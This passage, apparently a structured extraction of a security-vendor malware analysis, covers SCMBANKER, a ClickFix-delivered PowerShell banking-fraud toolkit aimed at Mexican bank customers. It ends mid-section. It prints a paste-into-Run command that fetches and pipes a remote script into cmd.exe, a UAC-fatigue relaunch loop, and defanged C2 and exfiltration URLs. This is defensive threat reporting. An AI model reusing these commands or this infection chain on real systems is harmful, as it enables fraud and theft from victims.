@@ -1,0 +1,2359 @@
+{
+ "meta": {
+  "adapter": "generic_html",
+  "extractor": "threat_library_html_v6",
+  "source_url": "https://www.elastic.co/security-labs/threat-command/mexican-banking-fraud-scmbanker-ref6045",
+  "source_host": "www.elastic.co",
+  "content_root": "main",
+  "scope_engine": "section_tree",
+  "scope_engine_version": "tl-scope-engine-section-tree-v2",
+  "section_tree_version": "tl-section-tree-v3",
+  "candidate_extraction_version": "tl-candidates-v30"
+ },
+ "title": "REF6045: Mexican banking fraud toolkit with signs of AI-assisted development",
+ "blocks": [
+  {
+   "id": "b001",
+   "page": null,
+   "text": "Threat Command",
+   "type": "paragraph",
+   "section": null
+  },
+  {
+   "id": "b002",
+   "page": null,
+   "text": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit",
+   "type": "heading",
+   "level": 1,
+   "section": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit"
+  },
+  {
+   "id": "b003",
+   "page": null,
+   "text": "Elastic Security Labs tracks REF6045, an active operator-assisted banking fraud operation targeting customers of Mexican banks, fintech, payment processors, and cryptocurrency exchanges.",
+   "type": "paragraph",
+   "section": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit"
+  },
+  {
+   "id": "b004",
+   "page": null,
+   "text": "July 08, 2026",
+   "type": "paragraph",
+   "section": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit"
+  },
+  {
+   "id": "b005",
+   "page": null,
+   "text": "Jia Yu ChanSalim Bitam",
+   "type": "paragraph",
+   "section": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit"
+  },
+  {
+   "id": "b006",
+   "page": null,
+   "text": "Malware Analysis",
+   "type": "paragraph",
+   "section": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit"
+  },
+  {
+   "id": "b007",
+   "page": null,
+   "text": "Jump to",
+   "type": "paragraph",
+   "section": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit"
+  },
+  {
+   "id": "b008",
+   "page": null,
+   "text": "Share",
+   "type": "paragraph",
+   "section": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit"
+  },
+  {
+   "id": "b009",
+   "page": null,
+   "text": "A Mexican banking fraud operation we're tracking as REF6045 doesn't run on autopilot. A human operator is behind the wheel, monitoring infected machines and deciding what happens next. Victims are infected through fake CAPTCHA pages that trick them into running a single command, which installs SCMBANKER, a PowerShell toolkit with components dating back to at least October 2025. Once installed, the operator can see when a victim opens a banking session, lock the screen behind a fake bank warning, push the victims toward live phone interaction, redirect the browser, or replace account numbers copied to the clipboard. For a full takeover, they can also deploy a commercial remote-access tool.",
+   "type": "paragraph",
+   "section": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit"
+  },
+  {
+   "id": "b010",
+   "page": null,
+   "text": "Key takeaways",
+   "type": "heading",
+   "level": 2,
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b011",
+   "page": null,
+   "text": "REF6045 adapts ClickFix delivery into operator-assisted banking fraud, using fake verification pages to stage a PowerShell toolkit (we’re calling SCMBANKER) on victim machines.",
+   "type": "list",
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b012",
+   "page": null,
+   "text": "SCMBANKER gives operators a full fraud workflow: banking-session monitoring, screenshot capture, vishing overlays, phishing redirects, clipboard manipulation, and Remote Utilities installation.",
+   "type": "list",
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b013",
+   "page": null,
+   "text": "SCMBANKER heavily targets Mexico’s financial ecosystem, including retail banks, business banking portals, fintechs, payment processors, cryptocurrency exchanges, investment platforms, SAT, and telecom services.",
+   "type": "list",
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b014",
+   "page": null,
+   "text": "Operator OPSEC failures, including open directories, a leaked web-root archive, and an unauthenticated file editor, expose the operation’s tooling and targeting logic.",
+   "type": "list",
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b015",
+   "page": null,
+   "text": "The scripts are riddled with AI-generated artifacts, indicating that the operator used an LLM to write most of the tooling.",
+   "type": "list",
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b016",
+   "page": null,
+   "text": "How Elastic Security Labs discovered REF6045",
+   "type": "heading",
+   "level": 2,
+   "section": "How Elastic Security Labs discovered REF6045"
+  },
+  {
+   "id": "b017",
+   "page": null,
+   "text": "On June 18, 2026, Elastic telemetry surfaced a host using bitsadmin to download a batch of suspicious PowerShell scripts from an open directory at http://68.211.161[.]46/files/. The open directory allowed us to retrieve the individual agent scripts directly, and from the same server, we recovered an archive, zkt.zip, containing the operation's full web root before it was removed.",
+   "type": "paragraph",
+   "section": "How Elastic Security Labs discovered REF6045"
+  },
+  {
+   "id": "b018",
+   "page": null,
+   "text": "Elastic Defend alerts detecting SCMBANKER's suspicious bitsadmin download activity",
+   "type": "paragraph",
+   "section": "How Elastic Security Labs discovered REF6045"
+  },
+  {
+   "id": "b019",
+   "page": null,
+   "text": "At the web root of http://68.211.161[.]46/, we found a ClickFix fake-CAPTCHA flow that presented itself as a security verification page. The page first asked the visitor to complete an image challenge, including a Spanish prompt to select fire hydrants, before moving into the familiar Windows Run verification instructions. The command fetches validation.txt from the same web server and pipes it directly into cmd.exe, using the lure text “Google Verificación Segura (Version 2025.5755)”. The page also sends a POST request to a tracking endpoint at https://ww.ssinvestigaciones[.]com/login3.php.",
+   "type": "paragraph",
+   "section": "How Elastic Security Labs discovered REF6045"
+  },
+  {
+   "id": "b020",
+   "page": null,
+   "text": "Spanish-language fake CAPTCHA challenge used in the REF6045 ClickFix banking fraud lure",
+   "type": "paragraph",
+   "section": "How Elastic Security Labs discovered REF6045"
+  },
+  {
+   "id": "b021",
+   "page": null,
+   "text": "Because navigator.clipboard.writeText() requires a secure, focused browser context to copy the malicious command to the victim's clipboard, the original IP (http://68.211.161[.]46/) was unlikely to be the only victim-facing delivery path. We identified multiple HTTPS ClickFix hosts that reused the same command pattern and pointed victims back to the exposed file servers for validation.txt.",
+   "type": "paragraph",
+   "section": "How Elastic Security Labs discovered REF6045"
+  },
+  {
+   "id": "b022",
+   "page": null,
+   "text": "The observed ClickFix and file-server variants are included in the following table. The C2 values were extracted from the PowerShell scripts hosted under each /files open directory.",
+   "type": "paragraph",
+   "section": "How Elastic Security Labs discovered REF6045"
+  },
+  {
+   "id": "b023",
+   "page": null,
+   "text": "ClickFix host | ClickFix validation.txt file source | File host (hosting toolkit) | C2 extracted from hosted PS1 scripts ¶ https://ratonvaquero2026[.]online/ | http://68.211.161[.]46/validation.txt | https://ratonvaquero2026[.]online/files/ | https://negratomasa2026[.]online/dashboard2/recData.php ¶ https://monteviral2026.duckdns[.]org/ | http://68.211.161[.]46/validation.txt | https://monteviral2026.duckdns[.]org/files/ | https://gestionmontelavaria2026[.]online/dashboard2/recData.php ¶ https://osogransd[.]online/ | http://216.250.112[.]100/validation.txt | https://osogransd[.]online/files/ | http://185.242.246[.]169/dashboard2/recData.php",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "https://ratonvaquero2026[.]online/",
+      "http://68.211.161[.]46/validation.txt",
+      "https://ratonvaquero2026[.]online/files/",
+      "https://negratomasa2026[.]online/dashboard2/recData.php"
+     ],
+     [
+      "https://monteviral2026.duckdns[.]org/",
+      "http://68.211.161[.]46/validation.txt",
+      "https://monteviral2026.duckdns[.]org/files/",
+      "https://gestionmontelavaria2026[.]online/dashboard2/recData.php"
+     ],
+     [
+      "https://osogransd[.]online/",
+      "http://216.250.112[.]100/validation.txt",
+      "https://osogransd[.]online/files/",
+      "http://185.242.246[.]169/dashboard2/recData.php"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": [
+     "ClickFix host",
+     "ClickFix validation.txt file source",
+     "File host (hosting toolkit)",
+     "C2 extracted from hosted PS1 scripts"
+    ]
+   },
+   "layout": "table",
+   "section": "How Elastic Security Labs discovered REF6045"
+  },
+  {
+   "id": "b024",
+   "page": null,
+   "text": "SCMBANKER's execution chain",
+   "type": "heading",
+   "level": 2,
+   "section": "SCMBANKER's execution chain"
+  },
+  {
+   "id": "b025",
+   "page": null,
+   "text": "Diagram of the REF6045 SCMBANKER execution chain from ClickFix lure to C2 control",
+   "type": "paragraph",
+   "section": "SCMBANKER's execution chain"
+  },
+  {
+   "id": "b026",
+   "page": null,
+   "text": "The initial infection chain described below uses the monteviral2026.duckdns[.]org ClickFix page as an example, but the observed variants follow the same pattern: they present a CAPTCHA-style verification page, including an image challenge, before copying a command to the clipboard and instructing the victim to run it from the Windows Run dialog.",
+   "type": "paragraph",
+   "section": "SCMBANKER's execution chain"
+  },
+  {
+   "id": "b027",
+   "page": null,
+   "text": "Below is an example command line:",
+   "type": "paragraph",
+   "section": "SCMBANKER's execution chain"
+  },
+  {
+   "id": "b028",
+   "page": null,
+   "text": "cmd /c curl -k http://68.211.161[.]46/validation.txt | cmd.exe & exit # CIoudfIare Google Verificación Segura (Version 2025.5755)",
+   "type": "code",
+   "section": "SCMBANKER's execution chain"
+  },
+  {
+   "id": "b029",
+   "page": null,
+   "text": "Decoy strings CIoudfIare with capital-I homoglyphs, and the Google Verificación Segura version text are reproduced verbatim.",
+   "type": "paragraph",
+   "section": "SCMBANKER's execution chain"
+  },
+  {
+   "id": "b030",
+   "page": null,
+   "text": "ClickFix fake verification page telling victims to paste a command into Windows Run",
+   "type": "paragraph",
+   "section": "SCMBANKER's execution chain"
+  },
+  {
+   "id": "b031",
+   "page": null,
+   "text": "Despite the .txt extension, it is a Windows batch script that prepares the host and sets up the full toolkit in six different stages.",
+   "type": "paragraph",
+   "section": "SCMBANKER's execution chain"
+  },
+  {
+   "id": "b032",
+   "page": null,
+   "text": "Fake update smokescreen",
+   "type": "heading",
+   "level": 3,
+   "section": "Fake update smokescreen"
+  },
+  {
+   "id": "b033",
+   "page": null,
+   "text": "The batch script immediately launches Microsoft Edge in kiosk mode pointing to fakeupdate[.]net, a well-known pentesting/red team site that renders a fake Windows Update screen. This distraction buys time for the script to fully execute.",
+   "type": "paragraph",
+   "section": "Fake update smokescreen"
+  },
+  {
+   "id": "b034",
+   "page": null,
+   "text": "start msedge.exe --kiosk https://fakeupdate[.]net/win10ue --edge-kiosk-type=fullscreen",
+   "type": "code",
+   "section": "Fake update smokescreen"
+  },
+  {
+   "id": "b035",
+   "page": null,
+   "text": "Fake Windows Update screen SCMBANKER displays to distract Mexican banking fraud victims",
+   "type": "paragraph",
+   "section": "Fake update smokescreen"
+  },
+  {
+   "id": "b036",
+   "page": null,
+   "text": "UAC consent fatigue loop",
+   "type": "heading",
+   "level": 3,
+   "section": "UAC consent fatigue loop"
+  },
+  {
+   "id": "b037",
+   "page": null,
+   "text": "Next, the malware checks if it is running as admin via net session. If it is not elevated, it shows a social-engineered message \"Windows: Se requieren permisos de administrador para actualizar su sistema...\" (Administrator permissions are required to update your system…), and relaunches itself with -Verb RunAs every 20 seconds, frustrating and forcing the victim to click “Yes” on the UAC consent prompt.",
+   "type": "paragraph",
+   "section": "UAC consent fatigue loop"
+  },
+  {
+   "id": "b038",
+   "page": null,
+   "text": ":check",
+   "type": "code",
+   "section": "UAC consent fatigue loop",
+   "line_group": "b038"
+  },
+  {
+   "id": "b039",
+   "page": null,
+   "text": "net session >nul 2>&1",
+   "type": "code",
+   "section": "UAC consent fatigue loop",
+   "line_group": "b038"
+  },
+  {
+   "id": "b040",
+   "page": null,
+   "text": "if %errorlevel%==0 goto admin",
+   "type": "code",
+   "section": "UAC consent fatigue loop",
+   "line_group": "b038"
+  },
+  {
+   "id": "b041",
+   "page": null,
+   "text": "echo Windows: Se requieren permisos de administrador para actualizar su sistema...",
+   "type": "code",
+   "section": "UAC consent fatigue loop",
+   "line_group": "b038"
+  },
+  {
+   "id": "b042",
+   "page": null,
+   "text": "powershell -Command \"Start-Process '%~f0' -Verb RunAs\"",
+   "type": "code",
+   "section": "UAC consent fatigue loop",
+   "line_group": "b038"
+  },
+  {
+   "id": "b043",
+   "page": null,
+   "text": "timeout /t 20 >nul",
+   "type": "code",
+   "section": "UAC consent fatigue loop",
+   "line_group": "b038"
+  },
+  {
+   "id": "b044",
+   "page": null,
+   "text": "goto check",
+   "type": "code",
+   "section": "UAC consent fatigue loop",
+   "line_group": "b038"
+  },
+  {
+   "id": "b045",
+   "page": null,
+   "text": "Cursor trap",
+   "type": "heading",
+   "level": 3,
+   "section": "Cursor trap"
+  },
+  {
+   "id": "b046",
+   "page": null,
+   "text": "Once elevated, an inline PowerShell P/Invoke call to user32.dll!ClipCursor confines the mouse to a single 1x1 pixel rectangle at the screen center, locking any mouse movement. This is paired with the fake Windows Update screen to encourage the victim to stay idle, giving time for the malware to download the full toolset in the background without interruption.",
+   "type": "paragraph",
+   "section": "Cursor trap"
+  },
+  {
+   "id": "b047",
+   "page": null,
+   "text": "PowerShell ClipCursor code SCMBANKER uses to lock a victim's mouse during infection",
+   "type": "paragraph",
+   "section": "Cursor trap"
+  },
+  {
+   "id": "b048",
+   "page": null,
+   "text": "Downloading the SCMBANKER toolkit via bitsadmin",
+   "type": "heading",
+   "level": 3,
+   "section": "Downloading the SCMBANKER toolkit via bitsadmin"
+  },
+  {
+   "id": "b049",
+   "page": null,
+   "text": "All malicious scripts, files, and binaries are pulled individually via bitsadmin from http://68.211.161[.]46/files/ to C:\\Users\\Public\\.",
+   "type": "paragraph",
+   "section": "Downloading the SCMBANKER toolkit via bitsadmin"
+  },
+  {
+   "id": "b050",
+   "page": null,
+   "text": "bitsadmin transfer jobs to download the SCMBANKER toolkit modules",
+   "type": "paragraph",
+   "section": "Downloading the SCMBANKER toolkit via bitsadmin"
+  },
+  {
+   "id": "b051",
+   "page": null,
+   "text": "SCMBANKER's persistence: registry Run key and startup folder",
+   "type": "heading",
+   "level": 3,
+   "section": "SCMBANKER's persistence: registry Run key and startup folder"
+  },
+  {
+   "id": "b052",
+   "page": null,
+   "text": "Two persistence mechanisms launched by C:\\Users\\Public\\run.vbs on logon, plus a one-shot infection marker:",
+   "type": "paragraph",
+   "section": "SCMBANKER's persistence: registry Run key and startup folder"
+  },
+  {
+   "id": "b053",
+   "page": null,
+   "text": "Run key: HKCU\\...\\Run, value \"run\", runs hidden PowerShell launching run.vbs.",
+   "type": "list",
+   "section": "SCMBANKER's persistence: registry Run key and startup folder"
+  },
+  {
+   "id": "b054",
+   "page": null,
+   "text": "Startup folder: run.vbs dropped to three path variants (%APPDATA%, %USERPROFILE%\\AppData\\Roaming, and the legacy XP %USERPROFILE%\\Start Menu).",
+   "type": "list",
+   "section": "SCMBANKER's persistence: registry Run key and startup folder"
+  },
+  {
+   "id": "b055",
+   "page": null,
+   "text": "RunOnce timestamp: value \"id\" writes %date% %time% to C:\\Users\\Public\\id.txt once on next logon, then self-deletes.",
+   "type": "list",
+   "section": "SCMBANKER's persistence: registry Run key and startup folder"
+  },
+  {
+   "id": "b056",
+   "page": null,
+   "text": "Forcing a reboot to trigger persistence",
+   "type": "heading",
+   "level": 3,
+   "section": "Forcing a reboot to trigger persistence"
+  },
+  {
+   "id": "b057",
+   "page": null,
+   "text": "The script sends an F11 keypress to exit fullscreen, followed by a Ctrl+W keypress sequence to close the fake Windows Update tab. However, this approach only works in a standard fullscreen browser window, not in kiosk mode. It then forces a reboot with the shutdown /r /t 02 command. Upon restart, the previous persistence mechanism via the Registry Run key triggers execution of the VBScript file (run.vbs).",
+   "type": "paragraph",
+   "section": "Forcing a reboot to trigger persistence"
+  },
+  {
+   "id": "b058",
+   "page": null,
+   "text": "Batch script commands SCMBANKER uses to close its decoy tab and force a reboot",
+   "type": "paragraph",
+   "section": "Forcing a reboot to trigger persistence"
+  },
+  {
+   "id": "b059",
+   "page": null,
+   "text": "The SCMBANKER toolkit",
+   "type": "heading",
+   "level": 2,
+   "section": "The SCMBANKER toolkit"
+  },
+  {
+   "id": "b060",
+   "page": null,
+   "text": "run.vbs: SCMBANKER's master launcher",
+   "type": "heading",
+   "level": 3,
+   "section": "run.vbs: SCMBANKER's master launcher"
+  },
+  {
+   "id": "b061",
+   "page": null,
+   "text": "The VBScript (run.vbs) is the master launcher. It uses WScript.Shell.Run with a hidden window style and Invoke-Expression to start the toolkit's modules in parallel:",
+   "type": "paragraph",
+   "section": "run.vbs: SCMBANKER's master launcher"
+  },
+  {
+   "id": "b062",
+   "page": null,
+   "text": "SCMBANKER's run.vbs master launcher starting each banking fraud toolkit module",
+   "type": "paragraph",
+   "section": "run.vbs: SCMBANKER's master launcher"
+  },
+  {
+   "id": "b063",
+   "page": null,
+   "text": "run.vbs launches the following modules:",
+   "type": "paragraph",
+   "section": "run.vbs: SCMBANKER's master launcher"
+  },
+  {
+   "id": "b064",
+   "page": null,
+   "text": "Script | Role ¶ rotor2.ps1 | Long-running process-mutation rotator for mensaje1.ps1 (vishing module) ¶ ini.ps1 | Delayed launcher for jujuzkt.ps1 (banking activity monitor) ¶ remo.ps1 | IP-gated launcher for jujuzkt2.ps1 (phishing redirect module) ¶ edifhjwe.ps1 | Toolkit updater ¶ cliente.ps1 | C2 beacon / implant control channel ¶ avs.ps1 | Remote Utilities RAT installer downloader ¶ clip.ps1 / clip2.ps1 | CLABE and card-number clipboard hijackers ¶ correr.ps1 | Arbitrary PowerShell executor ¶ cursor2.exe | Invisible-cursor utility (compiled AutoIt). Replaces every system cursor type with an invisible cursor at C:\\Users\\Public\\invi.cur",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "rotor2.ps1",
+      "Long-running process-mutation rotator for mensaje1.ps1 (vishing module)"
+     ],
+     [
+      "ini.ps1",
+      "Delayed launcher for jujuzkt.ps1 (banking activity monitor)"
+     ],
+     [
+      "remo.ps1",
+      "IP-gated launcher for jujuzkt2.ps1 (phishing redirect module)"
+     ],
+     [
+      "edifhjwe.ps1",
+      "Toolkit updater"
+     ],
+     [
+      "cliente.ps1",
+      "C2 beacon / implant control channel"
+     ],
+     [
+      "avs.ps1",
+      "Remote Utilities RAT installer downloader"
+     ],
+     [
+      "clip.ps1 / clip2.ps1",
+      "CLABE and card-number clipboard hijackers"
+     ],
+     [
+      "correr.ps1",
+      "Arbitrary PowerShell executor"
+     ],
+     [
+      "cursor2.exe",
+      "Invisible-cursor utility (compiled AutoIt). Replaces every system cursor type with an invisible cursor at C:\\Users\\Public\\invi.cur"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": [
+     "Script",
+     "Role"
+    ]
+   },
+   "layout": "table",
+   "section": "run.vbs: SCMBANKER's master launcher"
+  },
+  {
+   "id": "b065",
+   "page": null,
+   "text": "Pivoting in VirusTotal, we discovered earlier versions of the toolkit components, suggesting the tooling has been in use since at least October 2025 and has been iterated on for several months.",
+   "type": "paragraph",
+   "section": "run.vbs: SCMBANKER's master launcher"
+  },
+  {
+   "id": "b066",
+   "page": null,
+   "text": "VirusTotal scan showing 8 of 63 vendors flagging an early version of SCMBANKER's run.vbs launcher script",
+   "type": "paragraph",
+   "section": "run.vbs: SCMBANKER's master launcher"
+  },
+  {
+   "id": "b067",
+   "page": null,
+   "text": "C2 beacon and victim management",
+   "type": "heading",
+   "level": 3,
+   "section": "C2 beacon and victim management"
+  },
+  {
+   "id": "b068",
+   "page": null,
+   "text": "Every 30 seconds, cliente.ps1 collects a machine profile and performs an HTTP POST request to https://negratomasa2026[.]online/dashboard2/recData.php:",
+   "type": "paragraph",
+   "section": "C2 beacon and victim management"
+  },
+  {
+   "id": "b069",
+   "page": null,
+   "text": "The following table represents this request data and its associated fields:",
+   "type": "paragraph",
+   "section": "C2 beacon and victim management"
+  },
+  {
+   "id": "b070",
+   "page": null,
+   "text": "Field | Source | Purpose ¶ machine_name | $env:COMPUTERNAME | Victim identification ¶ client_id | GUID in client_id.txt | Unique implant ID (persists across reboots) ¶ ip_local | Get-NetIPAddress | Internal network recon ¶ ip_public | api.ipify.org | External IP for geolocation and targeting ¶ comentario | comentario.txt | Operator's notes/label for this victim ¶ idInternet | id.txt | Infection timestamp ¶ remoto | agent.txt | RAT installation status (default: SIN REMOTO AUN) ¶ comando | comando.txt | Last command received ¶ optUpdate | hardcoded “update” | Meant to flag whether the remote tool is installed, but it's overridden to always say \"update\" (likely debugging leftover) ¶ timestamp | Unix epoch | Beacon time",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "machine_name",
+      "$env:COMPUTERNAME",
+      "Victim identification"
+     ],
+     [
+      "client_id",
+      "GUID in client_id.txt",
+      "Unique implant ID (persists across reboots)"
+     ],
+     [
+      "ip_local",
+      "Get-NetIPAddress",
+      "Internal network recon"
+     ],
+     [
+      "ip_public",
+      "api.ipify.org",
+      "External IP for geolocation and targeting"
+     ],
+     [
+      "comentario",
+      "comentario.txt",
+      "Operator's notes/label for this victim"
+     ],
+     [
+      "idInternet",
+      "id.txt",
+      "Infection timestamp"
+     ],
+     [
+      "remoto",
+      "agent.txt",
+      "RAT installation status (default: SIN REMOTO AUN)"
+     ],
+     [
+      "comando",
+      "comando.txt",
+      "Last command received"
+     ],
+     [
+      "optUpdate",
+      "hardcoded “update”",
+      "Meant to flag whether the remote tool is installed, but it's overridden to always say \"update\" (likely debugging leftover)"
+     ],
+     [
+      "timestamp",
+      "Unix epoch",
+      "Beacon time"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": [
+     "Field",
+     "Source",
+     "Purpose"
+    ]
+   },
+   "layout": "table",
+   "section": "C2 beacon and victim management"
+  },
+  {
+   "id": "b071",
+   "page": null,
+   "text": "The C2 response contains two operator-controlled fields.",
+   "type": "paragraph",
+   "section": "C2 beacon and victim management"
+  },
+  {
+   "id": "b072",
+   "page": null,
+   "text": "The data from the comentario field is saved to comentario.txt and stores the operator’s label or notes for the victim.",
+   "type": "paragraph",
+   "section": "C2 beacon and victim management"
+  },
+  {
+   "id": "b073",
+   "page": null,
+   "text": "The data from the comando field is saved to comando.txt. Other modules poll that file for operator instructions:",
+   "type": "paragraph",
+   "section": "C2 beacon and victim management"
+  },
+  {
+   "id": "b074",
+   "page": null,
+   "text": "avs.ps1 handles MSI URLs.",
+   "type": "list",
+   "section": "C2 beacon and victim management"
+  },
+  {
+   "id": "b075",
+   "page": null,
+   "text": "edifhjwe.ps1 handles ZIP update packages.",
+   "type": "list",
+   "section": "C2 beacon and victim management"
+  },
+  {
+   "id": "b076",
+   "page": null,
+   "text": "correr.ps1 handles PowerShell-prefixed execution requests.",
+   "type": "list",
+   "section": "C2 beacon and victim management"
+  },
+  {
+   "id": "b077",
+   "page": null,
+   "text": "The following image shows the server response parsing logic.",
+   "type": "paragraph",
+   "section": "C2 beacon and victim management"
+  },
+  {
+   "id": "b078",
+   "page": null,
+   "text": "PowerShell code showing SCMBANKER's self-update module downloading a new toolkit ZIP",
+   "type": "paragraph",
+   "section": "C2 beacon and victim management"
+  },
+  {
+   "id": "b079",
+   "page": null,
+   "text": "Banking activity monitor",
+   "type": "heading",
+   "level": 3,
+   "section": "Banking activity monitor"
+  },
+  {
+   "id": "b080",
+   "page": null,
+   "text": "The primary banking activity monitor is a PowerShell script (jujuzkt.ps1), but it also has optional active branches:",
+   "type": "paragraph",
+   "section": "Banking activity monitor"
+  },
+  {
+   "id": "b081",
+   "page": null,
+   "text": "URL injection when a configured target has a redirect URL, and",
+   "type": "list",
+   "section": "Banking activity monitor"
+  },
+  {
+   "id": "b082",
+   "page": null,
+   "text": "a commented-out keylogger rotator path via rotor.ps1.",
+   "type": "list",
+   "section": "Banking activity monitor"
+  },
+  {
+   "id": "b083",
+   "page": null,
+   "text": "After a short startup delay, invoked by ini.ps1, the banking monitor script refreshes three configuration files every five minutes.",
+   "type": "paragraph",
+   "section": "Banking activity monitor"
+  },
+  {
+   "id": "b084",
+   "page": null,
+   "text": "Remote URL | Local File | Content ¶ https://negratomasa2026[.]online/a/teleavisos.txt | config1.txt | Arbitrary PowerShell executed via Invoke-Expression ¶ https://negratomasa2026[.]online/b/listadebancos.txt | config2.txt | Window title keywords (bank names + optional redirection target, *-delimited) ¶ https://negratomasa2026[.]online/b/keysnegativas.txt | config_negative.txt | Negative keywords to filter out false matches when scanning opened windows",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "https://negratomasa2026[.]online/a/teleavisos.txt",
+      "config1.txt",
+      "Arbitrary PowerShell executed via Invoke-Expression"
+     ],
+     [
+      "https://negratomasa2026[.]online/b/listadebancos.txt",
+      "config2.txt",
+      "Window title keywords (bank names + optional redirection target, *-delimited)"
+     ],
+     [
+      "https://negratomasa2026[.]online/b/keysnegativas.txt",
+      "config_negative.txt",
+      "Negative keywords to filter out false matches when scanning opened windows"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": [
+     "Remote URL",
+     "Local File",
+     "Content"
+    ]
+   },
+   "layout": "table",
+   "section": "Banking activity monitor"
+  },
+  {
+   "id": "b085",
+   "page": null,
+   "text": "Once running, the banking activity monitor checks all visible window titles every second. A match (full list here) against any listed bank, fintech, payment processor, crypto exchange, brokerage, SAT, or telecom keywords causes the implant to POST an alert to https://negratomasa2026[.]online/dashboard2/avisos2.php in the following format:",
+   "type": "paragraph",
+   "section": "Banking activity monitor"
+  },
+  {
+   "id": "b086",
+   "page": null,
+   "text": "mensaje = \"<window title>",
+   "type": "code",
+   "section": "Banking activity monitor",
+   "line_group": "b086"
+  },
+  {
+   "id": "b087",
+   "page": null,
+   "text": "Detected C0incidence: '<keyword>'",
+   "type": "code",
+   "section": "Banking activity monitor",
+   "line_group": "b086"
+  },
+  {
+   "id": "b088",
+   "page": null,
+   "text": "Version: V.1.0.1",
+   "type": "code",
+   "section": "Banking activity monitor",
+   "line_group": "b086"
+  },
+  {
+   "id": "b089",
+   "page": null,
+   "text": "10:03 p. m. 08/12/2025",
+   "type": "code",
+   "section": "Banking activity monitor",
+   "line_group": "b086"
+  },
+  {
+   "id": "b090",
+   "page": null,
+   "text": "Nombre de PC: <hostname>",
+   "type": "code",
+   "section": "Banking activity monitor",
+   "line_group": "b086"
+  },
+  {
+   "id": "b091",
+   "page": null,
+   "text": "Cliente desde: <id>",
+   "type": "code",
+   "section": "Banking activity monitor",
+   "line_group": "b086"
+  },
+  {
+   "id": "b092",
+   "page": null,
+   "text": "Client ID: <clientId>",
+   "type": "code",
+   "section": "Banking activity monitor",
+   "line_group": "b086"
+  },
+  {
+   "id": "b093",
+   "page": null,
+   "text": "IP: <public_ip>",
+   "type": "code",
+   "section": "Banking activity monitor",
+   "line_group": "b086"
+  },
+  {
+   "id": "b094",
+   "page": null,
+   "text": "Navegador: <process_name>",
+   "type": "code",
+   "section": "Banking activity monitor",
+   "line_group": "b086"
+  },
+  {
+   "id": "b095",
+   "page": null,
+   "text": "<current timestamp>\"",
+   "type": "code",
+   "section": "Banking activity monitor",
+   "line_group": "b086"
+  },
+  {
+   "id": "b096",
+   "page": null,
+   "text": "clientId = <clientId>",
+   "type": "code",
+   "section": "Banking activity monitor",
+   "line_group": "b086"
+  },
+  {
+   "id": "b097",
+   "page": null,
+   "text": "A banking match also starts the screenshot workflow through the toolkit’s rotator pattern. The rotor scripts act as short-lived wrappers: they copy a target script into %TEMP% under Windows-like process names, execute the copy, and repeat for a set period. In this case, rotor1.ps1 repeatedly spawns screen2.ps1 every 7 seconds for 5 minutes, producing about 42 screenshots per trigger. Each screen2.ps1 run captures the full virtual desktop, compresses the image under 10 MB, and uploads it to https://negratomasa2026[.]online/dashboard2/imagenes.php.",
+   "type": "paragraph",
+   "section": "Banking activity monitor"
+  },
+  {
+   "id": "b098",
+   "page": null,
+   "text": "PowerShell code from SCMBANKER's rotor and screen modules compressing and uploading screenshots",
+   "type": "paragraph",
+   "section": "Banking activity monitor"
+  },
+  {
+   "id": "b099",
+   "page": null,
+   "text": "SCMBANKER's keylogging module",
+   "type": "heading",
+   "level": 3,
+   "section": "SCMBANKER's keylogging module"
+  },
+  {
+   "id": "b100",
+   "page": null,
+   "text": "jujuzkt.ps1 also contains a commented-out path to launch rotor.ps1, a short-lived rotator for key.ps1. While the banking monitor path launches rotor1.ps1 for screenshots, the presence of rotor.ps1 and key.ps1 shows an additional keylogging capability in the toolkit. rotor.ps1 applies the same rotator pattern to C:\\Users\\Public\\key.ps1.",
+   "type": "paragraph",
+   "section": "SCMBANKER's keylogging module"
+  },
+  {
+   "id": "b101",
+   "page": null,
+   "text": "This PowerShell script (key.ps1) fetches Telegram bot credentials from https://negratomasa2026[.]online/a/telekeylogger.txt via Invoke-Expression, but never references them after assignment. The only exfiltration path in the script is an HTTP POST to https://negratomasa2026[.]online/dashboard2/logs.php with the client ID and hostname. The Telegram configuration may be leftover code from an earlier version.",
+   "type": "paragraph",
+   "section": "SCMBANKER's keylogging module"
+  },
+  {
+   "id": "b102",
+   "page": null,
+   "text": "The vishing engine: turning infections into live phone scams",
+   "type": "heading",
+   "level": 3,
+   "section": "The vishing engine: turning infections into live phone scams"
+  },
+  {
+   "id": "b103",
+   "page": null,
+   "text": "The vishing engine is what turns a commodity-looking PowerShell bundle into an operator-assisted fraud workflow. rotor2.ps1 applies the rotator pattern to mensaje1.ps1, keeping the dispatcher alive under changing Windows-like filenames.",
+   "type": "paragraph",
+   "section": "The vishing engine: turning infections into live phone scams"
+  },
+  {
+   "id": "b104",
+   "page": null,
+   "text": "When mensaje1.ps1 is launched, every 10 seconds it fetches https://negratomasa2026[.]online/b/<redacted>.txt, where each line has the format <IP>*<URL>, mapping a victim public IP address to a vishing page URL. If the victim’s public IP appears in that list, the dispatcher launches a vishing lock-screen module and records the child process ID so it can later release the victim when the IP is removed.",
+   "type": "paragraph",
+   "section": "The vishing engine: turning infections into live phone scams"
+  },
+  {
+   "id": "b105",
+   "page": null,
